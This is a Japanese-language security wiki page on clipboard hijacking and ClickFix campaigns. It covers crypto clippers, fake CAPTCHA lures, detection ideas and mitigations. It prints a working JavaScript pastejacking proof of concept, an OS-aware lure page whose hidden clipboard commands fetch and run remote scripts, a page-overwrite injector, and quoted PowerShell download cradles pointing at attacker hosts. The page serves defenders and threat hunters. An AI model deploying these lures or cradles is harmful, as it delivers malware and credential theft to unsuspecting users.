# Clipboard Hijacking (Pastejacking) 攻撃

> 「自分でコピーしていないものは、決して貼り付けないこと。」– 古いが今なお有効なアドバイス

## 概要

Clipboard hijacking（*pastejacking* とも呼ばれる）は、ユーザーが内容を確認せずにコマンドをコピー＆ペーストする習慣を悪用します。悪意のある Web ページ（または Electron や Desktop アプリケーションなど、JavaScript を実行可能なコンテキスト）は、攻撃者が制御するテキストをプログラムによってシステムクリップボードに配置します。被害者は通常、巧妙に作成されたソーシャルエンジニアリングの指示によって、**Win + R**（Run ダイアログ）、**Win + X**（Quick Access / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付ける*よう誘導され、任意のコマンドを直ちに実行してしまいます。

**ファイルのダウンロードや添付ファイルの開封が行われない**ため、この手法は添付ファイル、マクロ、またはコマンドの直接実行を監視する、ほとんどのメールおよび Web コンテンツのセキュリティ制御を回避します。そのため、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer などの一般的なマルウェアファミリーを配布する phishing キャンペーンで広く使われています。<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

もう1つの **clipboard hijacking** の亜種は、コマンドをまったく貼り付けません。被害者が**暗号通貨ウォレットアドレス**をコピーするまで待機し、貼り付ける直前に攻撃者が制御するアドレスへ密かに置き換えます。これは、ユーザーが最初と最後の文字だけを確認することが多い、長いウォレット形式に対して特に効果的です。<sup>[[8]](#references)</sup>

実際の攻撃でよく見られる特徴:
- **Thin loader + nested payload**: 表面上の app/exe は正規の trading または「profit」ツールに見えますが、実際の clipper は bundle のさらに深い場所に隠されています（たとえば、.NET loader が nested Rust payload を起動します）。
- **Regex-driven replacement**: マルウェアは `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、さらには汎用的な**44文字の Solana-like**文字列などに一致する文字列を検出し、攻撃者のウォレットへ書き換えます。
- **Wallet rotation at scale**: 最新の Windows samples では、単一の static address ではなく、通貨ごとに**数千**の replacement wallets が埋め込まれていることがあります。これにより、盗難のたびにウォレットの reputation が低下するリスクを抑えられます。<sup>[[8]](#references)</sup>

### Windows clipper flow

一般的な実装は、**`AddClipboardFormatListener`** によって登録された hidden window です。クリップボードが更新されるたびに、マルウェアは通常、次の処理を呼び出します:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 現在のクリップボードデータにアクセスする。
- **`GetClipboardData`** → テキストを読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → ウォレット文字列を攻撃者の値に置き換える。

clippers で頻繁に確認される、最小限の hunting regexes:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
ユーザーレベルの永続化で十分な影響を与えられます。確認されたパターンの1つは次のとおりです。<sup>[[8]](#references)</sup>
- ペイロードを **`%APPDATA%\silke\silke.exe`** にコピーする
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` の下に **Startup フォルダーの LNK** を作成する

検知のアイデア:
- クリップボード API を継続的に呼び出しながら、`%APPDATA%` およびユーザーの **Startup** フォルダーに書き込むプロセス。
- 新しい LNK/実行ファイルの作成後に、wallet-address のクリップボード書き換えが発生する。
- 未使用ファイルを多数含み、小さな launcher が内部の別の binary を起動するアーカイブまたは偽ソフトウェアの bundle。

### macOS のソーシャルエンジニアリングによる quarantine 削除 + LaunchAgent 永続化

macOS では、一部のキャンペーンが **`unlocker.command`** helper を配布し、Gatekeeper がアプリを破損している、または未確認の developer からのものだと表示した場合に、victim に右クリック → **Open** を指示します。この script は単に quarantine を削除し、近くにある `.app` を起動します。<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
これは **Gatekeeper exploit** ではありません。`com.apple.quarantine` xattr に依存する Gatekeeper の判定を悪用した、**social-engineered quarantine bypass** です。<sup>[[8]](#references)</sup>

実行後、clipper は次のファイルを書き込むことで、現在のユーザーとして persistence できます。<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` と `KeepAlive` を指定した LaunchAgent

防御上重要なのは、一部のサンプルが **self-healing watchdog** を実装し、約 30 秒ごとに LaunchAgent と wrapper を再書き込みする点です。実行中の process を終了せずに plist を先に削除すると、malware が直ちに再作成する可能性があります。<sup>[[8]](#references)</sup> Safe cleanup order:
1. 実行中の clipper process を kill する。
2. LaunchAgent plist を unload/delete する。
3. `~/launch.sh` とコピーされた payload を削除する。

### Delivery note: fake reputation as a force multiplier

この family では、malware 自体は技術的に単純なままでも、**distribution layer** が大きな役割を果たします。fake GitHub stars/forks、SourceForge の reviews/downloads、YouTube tutorial の comments/views、そして無害に見える VirusTotal comments/votes を利用し、実行前に binary が trustworthy に見えるようにします。<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

一部の macOS infostealer は installer site（例: Homebrew）を clone し、ユーザーが表示されている text の一部だけを highlight できないように、**「Copy」button の使用を強制**します。clipboard entry には、想定された installer command と、追加された Base64 payload（例: `...; echo <b64> | base64 -d | sh`）が含まれているため、single paste で両方が実行されます。一方、UI では追加の stage が隠されます。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaignsでは `document.execCommand('copy')` が使用され、最近のものでは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake フロー

1. ユーザーが typosquatting されたサイトまたは侵害されたサイト（例: `docusign.sa[.]com`）にアクセスする
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64でエンコードされた PowerShell one-liner をクリップボードに気付かれないよう保存する。
3. HTML の指示により、被害者に次の操作を促す: *「**Win + R** を押し、コマンドを貼り付けて Enter を押し、問題を解決してください。」*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL（典型的な DLL sideloading）を含むアーカイブをダウンロードする。
5. loader が追加のステージを復号し、shellcode を inject して persistence（例: scheduled task）をインストールし、最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。<sup>[[1]](#references)</sup>

### 例: NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正規の Java WebStart）は、そのディレクトリ内で `msvcp140.dll` を検索する。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードし、ローリング XOR キー `"https://google.com/"` を使用して復号し、最終的な shellcode をインジェクトした後、**client32.exe**（NetSupport RAT）を `C:\ProgramData\SecurityCheck_v1\` に解凍する。<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** で `la.txt` をダウンロード
2. **cscript.exe** 内で JScript downloader を実行
3. MSI payload を取得 → 署名済みアプリケーションの隣に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 呼び出しは、隠し PowerShell スクリプトを起動し、`PartyContinued.exe` を取得して、`Boat.pst`（CAB）を展開し、`extrac32` とファイル連結によって `AutoIt3.exe` を再構築します。最後に、ブラウザ認証情報を `sumeriavgv.digital` へ exfiltrate する `.a3x` スクリプトを実行します。<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix campaign では、ファイルのダウンロードを完全に省略し、WSH 経由で JavaScript を取得・実行し、それを永続化して、C2 を毎日ローテーションする one-liner を被害者に貼り付けさせます。観測された chain の例:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 難読化された URL を実行時に反転させ、簡単な調査を回避する。
- JavaScript は Startup LNK（WScript/CScript）を介して永続化し、現在の日付によって C2 を選択することで、ドメインの迅速なローテーションを可能にする。<sup>[[3]](#references)</sup>

日付によって C2 をローテーションするために使用される最小限の JS フラグメント：<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、通常、persistenceを確立してRAT（例：PureHVNC）を取得するloaderが展開されます。このloaderは、ハードコードされた証明書にTLS pinningを行い、通信をchunkingすることがよくあります。<sup>[[3]](#references)</sup>

このvariantに特有のDetection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または`cscript.exe`）。
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 内のLNKから、`%TEMP%`／`%APPDATA%` 配下のJS pathを指定してWScript／CScriptを呼び出すもの。
- `.split('').reverse().join('')` または `eval(a.responseText)` を含むRegistry／RunMRUおよびcommand-line telemetry。
- 長いcommand lineを使わずに長大なscriptを渡すため、大きなstdin payloadを指定して `powershell -NoProfile -NonInteractive -Command -` を繰り返し実行するもの。
- updaterに見せかけたtask/path（例：`\GoogleSystem\GoogleUpdater`）の下で、後続的に `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のようなLOLBinsを実行するScheduled Tasks。

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patternを持つ、日次でrotateするC2 hostnamesおよびURLs。
- clipboard write eventsの後にWin+Rによるpasteが発生し、直後に`powershell.exe`が実行される流れをcorrelateする。

Blue-teamsは、clipboard、process-creation、registry telemetryを組み合わせてpastejacking abuseを特定できます。

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` には**Win + R**コマンドの履歴が保存されます。通常とは異なるBase64／obfuscated entriesを探します。
* Security Event ID **4688**（Process Creation）で、`ParentImage` == `explorer.exe` かつ`NewProcessName`が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるもの。
* 疑わしい4688 eventの直前に、`%LocalAppData%\Microsoft\Windows\WinX\` またはtemporary folders配下でfile creationsを示すEvent ID **4663**。
* EDR clipboard sensors（存在する場合）– `Clipboard Write` の直後に新しいPowerShell processが生成されたことをcorrelateします。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のcampaignでは、偽のCDN／browser verification pages（「Just a moment…」、IUAM-style）が大量に作成され、ユーザーにclipboardからOS-specific commandsをnative consolesへcopyさせます。これによりexecutionをbrowser sandboxの外部へ移行し、WindowsとmacOSの両方で動作します。<sup>[[4]](#references)</sup>

builder-generated pagesの主な特徴
- `navigator.userAgent`によるOS detectionでpayloadを調整します（Windows PowerShell／CMD 対 macOS Terminal）。非対応OS向けにoptional decoys／no-opsを用意し、illusionを維持することもあります。
- benignなUI actions（checkbox／Copy）でautomatic clipboard-copyを行う一方、表示されるtextはclipboard contentと異なる場合があります。
- Mobile blockingとstep-by-step instructions付きのpopover：Windows → Win+R→paste→Enter、macOS → Terminalを開く→paste→Enter。
- optional obfuscationとsingle-file injectorにより、侵害されたsiteのDOMをTailwind-styled verification UIで上書きします（新しいdomain registrationは不要）。<sup>[[4]](#references)</sup>

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOSで初回実行を永続化
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用すると、ターミナルを閉じた後も実行が継続され、目に見える痕跡を減らせます。<sup>[[4]](#references)</sup>

侵害したサイト上でのページのその場での乗っ取り
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lure に特有の Detection と hunting のアイデア
- Web: Clipboard API を verification widget にバインドするページ、表示テキストと clipboard payload の不一致、`navigator.userAgent` による分岐、不審なコンテキストにおける Tailwind + single-page replace。
- Windows endpoint: ブラウザー操作の直後に発生する `explorer.exe` → `powershell.exe`/`cmd.exe`、`%TEMP%` から実行される batch/MSI installer。
- macOS endpoint: ブラウザーイベントの前後で Terminal/iTerm が `bash`/`curl`/`base64 -d` を spawn し、Terminal を閉じた後も存続する background job。
- `RunMRU` Win+R history と clipboard writes を、その後の console process creation と相関付ける。

関連する supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake は引き続き WordPress sites を compromise し、external hosts（Cloudflare Workers、GitHub/jsDelivr）を連鎖させる loader JavaScript を inject している。さらに、blockchain の「etherhiding」calls（例：`bsc-testnet.drpc[.]org` などの Binance Smart Chain API endpoints への POST）も使用し、現在の lure logic を取得する。最近の overlay では、何かを download させる代わりに、one-liner を copy/paste するようユーザーに指示する fake CAPTCHA（T1204.004）が多用されている。<sup>[[6]](#references)</sup>
- Initial execution は、signed script hosts/LOLBAS に委譲される傾向が強まっている。2026 年 1 月の chain では、従来の `mshta` の使用を、`WScript.exe` 経由で実行される組み込みの `SyncAppvPublishingServer.vbs` に置き換え、aliases/wildcards を含む PowerShell-like arguments を渡して remote content を fetch していた：<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V によって使用されます。`WScript.exe` と、通常とは異なる引数（`gal`/`gcm` aliases、ワイルドカード化された cmdlets、jsDelivr URLs）を組み合わせると、ClearFake の高シグナルな LOLBAS stage になります。<sup>[[6]](#references)</sup>
- 2026 年 2 月、fake CAPTCHA payloads は pure PowerShell download cradles に戻りました。実稼働中の例を 2 つ示します。<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 最初のチェーンはメモリ内で実行する `iex(irm ...)` grabber で、2つ目は `WinHttp.WinHttpRequest.5.1` を介して段階実行し、一時 `.ps1` を書き込んだ後、非表示ウィンドウで `-ep bypass` を付けて起動します。<sup>[[6]](#references)</sup>

これらの亜種に対する検知・ハンティングのヒント
- プロセス系譜: ブラウザ → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`、またはクリップボードへの書き込み／Win+R の直後に PowerShell cradles。
- コマンドラインキーワード: `SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker のドメイン、または raw IP を使用する `iex(irm ...)` パターン。
- Network: Web 閲覧の直後に、script hosts/PowerShell から CDN worker hosts または blockchain RPC endpoints への outbound 通信。
- File/registry: `%TEMP%` 配下での一時 `.ps1` 作成、およびこれらの one-liner を含む RunMRU エントリ。外部 URL や難読化された alias strings を伴って実行される signed-script LOLBAS（WScript/cscript/mshta）を block/alert。

## 2026年6月の ClickFix tradecraft: paste telemetry、偽の verification comments、LOLBin chaining

最近の Red Canary telemetry によると、安定した indicator は**特定の1つのコマンド**ではなく、**user-assisted paste-and-run**、**trusted interpreters/LOLBins**、**obfuscated flags**、**remote retrieval**、**immediate execution**の組み合わせです。<sup>[[7]](#references)</sup>

### 注目すべき operator patterns

- **Paste confirmation telemetry**: 一部の payload は、実際の stage の前に `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` を呼び出します。これにより、ウィンドウを短時間かつ目立たない状態に保ちながら、ユーザー操作を確認します。
- **Fake verification comments**: PowerShell one-liner は、`# Security check ✔️ I'm not a robot Verification ID: 138105` のような文字列を追加する場合があります。これにより、Run / `cmd.exe` / PowerShell history に貼り付けた後も、コマンドが CAPTCHA 関連に見える状態を維持します。
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` は、コマンドラインに static URL を残さず、メモリ内での download-and-execute を実行します。
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` は、flag に通常とは異なる大文字・小文字や Unicode-like characters を使用し、`msiexec.exe` に似た外観を保ちながら脆弱な検知を回避します。
- **Caret-escaped LOLBin chains**: `cmd.exe` は `^` escape（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`）によってキーワードを隠し、nested shell を minimized で起動し、attacker content を `.pdf` などの benign extension で保存した後、`mshta` を介して実行できます。<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access（`dom.events.asyncClipboard.clipboardItem` など）を無効化するか、user gesture を必須にする。
2. Security awareness – ユーザーに、機密性の高いコマンドは*入力*するか、まず text editor に貼り付けるよう教育する。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control により、任意の one-liner を block する。
4. Network controls – 既知の pastejacking および malware C2 domains への outbound requests を block する。

## Related Tricks

* **Discord Invite Hijacking** は、ユーザーを悪意のある server に誘導した後、同じ ClickFix approach を悪用することがよくあります:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: ClickFix Attack Vector の防止](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtain の下で: RAT から Builder、Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: IUAM ClickFix Generator の初の公開](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025年、Infostealer の年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: 2026年2月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: 2026年6月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Stars から Upvotes へ: Crypto Clipboard Hijacker に偽の評判を与える手法](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
